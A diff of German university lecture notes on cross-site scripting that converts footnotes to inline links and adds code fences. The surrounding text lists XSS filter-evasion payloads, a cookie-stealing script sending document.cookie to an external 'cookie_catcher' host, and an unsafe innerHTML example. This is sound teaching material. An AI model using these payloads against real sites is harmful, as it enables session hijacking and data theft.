@@ -109,6 +109,7 @@ abzielen, sind sie für diese Vorlesung out-of-scope.
 Ein Problem an XSS-Angriffsmustern ist, dass diese sehr stark variieren
 können und daher schwer zu filtern sind; anbei mehrere XSS-Muster:
 
+```html
     <script>alert(1);</script>
     <SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
 
@@ -121,9 +122,10 @@ können und daher schwer zu filtern sind; anbei mehrere XSS-Muster:
     <IMG SRC="jav    ascript:alert('XSS');">
     <BGSOUND SRC="javascript:alert('XSS');">
     <IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+```
 
-Eine gute Quelle für weitere XSS-Beispiele ist das OWASP XSS Filter
-Evasion Cheat Sheet[2].
+Eine gute Quelle für weitere XSS-Beispiele ist das [OWASP XSS Filter
+Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet).
 
 ### XSS-Payloads
 
@@ -145,9 +147,11 @@ Findet der Angreifer auf der Opferwebseite eine persistent-XSS
 Möglichkeit, könnte er nun folgendes Javascript-Fragement als
 XSS-Payload verwenden:
 
+```html
     <script>
         document.location="https://offensive.one/cookie_catcher?c="+document.cookie;
     </script>
+```
 
 Der Webbrowser würde also zu einer neuen URL auf dem Angreifer-Server
 navigiert werden. Ein Teil der URl ist der Parameter ,,c”, dieser
@@ -169,6 +173,7 @@ durchgeführt. Bösartig an diesem ist, dass die direkten Inhalte
 
 Ein Beispiel wäre folgende Opferwebseite:
 
+```html
     <html>
         <head>..
             <script src="http://cdn.local/script.js"></script>
@@ -177,6 +182,7 @@ Ein Beispiel wäre folgende Opferwebseite:
             <h1>My Company</h1>
         </body>
     </html>
+```
 
 In diesem konkrete Beispiel wird Javascript von einem *Content Delivery
 Network* geladen, liegt also nicht lokal am Opfer-Webserver vor. Ein
@@ -191,8 +197,7 @@ schlußendlich so die Opfer-Webseite defaced.
 #### Social Engineering
 
 XSS kann auch als Teil von Social-Engineering Angriffen verwendet
-werden. Ein Besipiel hierfür wäre das BeEF-Framework (*The Browser
-Exploitation Framework Projekt*[3]). Bei diesem wird über Javascript ein
+werden. Ein Besipiel hierfür wäre das [BeEF-Framework](https://beefproject.com/). Bei diesem wird über Javascript ein
 Client-Handler im Browser installiert. Hierfür könnte z. B. eine
 XSS-Lücke missbraucht werden. Über diesen Handler können mehrere
 Attacken gestartet werden, unter anderem:
@@ -220,7 +225,7 @@ Entschädigungsmodel für Webseitenautoren verwendet.
 
 XSS kann auch verwendet werden, um den Browser des Opfers Teil eines
 DDoS-Botnets zu machen. Ein berühmtes Beispiel hierfür ist die LOIC
-(*Low-Orbit Ion Canon*[4]) die z.B. auch gerne von Anonymous verwendet
+([Low-Orbit Ion Canon](https://en.wikipedia.org/wiki/Low_Orbit_Ion_Cannon)) die z.B. auch gerne von Anonymous verwendet
 wurde.
 
 #### Stehlen von Daten aus einem Passwortmanager
@@ -376,16 +381,18 @@ werden; wird eine Eingabe Teil von HTML muss diese HTML-gequoted werden.
 Wird eine Eingabe serverseitig als Teil von HTML ausgegeben und ist
 wiederum selbst Teil eines JavaScripts, dann muss die Eingabe sowohl
 Javascript- als auch HTML-gequotet werden. Eine gute Übersicht über
-diese Problematik gibt das OWASP XSS Prevention Cheat Sheet[5]. Ein
+diese Problematik gibt das [OWASP XSS Prevention Cheat Sheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.md). Ein
 einfaches Beispiel hierfür wäre folgendes serverseitige Source Code
 Fragment:
 
+```html
     <script>
     var x = '<%= taintedVar %>';
     var d = document.createElement('div');
     d.innerHTML = x;
     document.body.appendChild(d);
     </script>
+```
 
 Die Variable *taintedVar* wird hier in einen Javascript-String eingefügt
 (Zeile 2), hierbei muss sie gequoted werden, damit Schadcode nicht den
@@ -806,14 +813,6 @@ welche HTML/XML-Daten als Baumstruktur darstellt. Mittels Javascript
 kann das DOM modifiziert werden um beispielsweise Elemente bzw. deren
 Attribute hinzuzufügen, entfernen oder zu modifizieren; Eventhandler zu
 setzen bzw. Events zu feuern; bzw. um CSS zu verändern.
-
-[2] <https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet>
-
-[3] <https://beefproject.com/>
-
-[4] <https://en.wikipedia.org/wiki/Low_Orbit_Ion_Cannon>
-
-[5] <https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.md>
 
 [6] Dies wird als UXSS bezeichnet, siehe auch
 <https://blog.innerht.ml/the-misunderstood-x-xss-protection/>.
